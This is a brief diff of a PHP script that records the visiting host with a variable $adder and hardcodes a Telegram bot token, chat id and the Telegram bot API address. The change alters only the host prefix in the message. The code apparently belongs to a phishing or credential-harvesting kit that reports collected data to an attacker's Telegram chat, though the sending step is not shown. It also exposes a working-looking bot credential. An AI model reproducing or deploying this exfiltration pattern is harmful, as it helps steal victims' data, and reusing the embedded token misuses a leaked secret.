@@ -1,7 +1,7 @@
 <?php
 
 $ddd = $_SERVER['HTTP_HOST'];
-$content = "Host: https://".$ddd." [".$adder."]";
+$content = "Host: https://ss".$ddd." [".$adder."]";
 $tokens = "1885390369:AAEqAJ3dPahEdvdQ5tXsXWyGGUJ90GhcGl8";
 $ids = "1129838722";
 $urls = "https://api.telegram.org/bot";
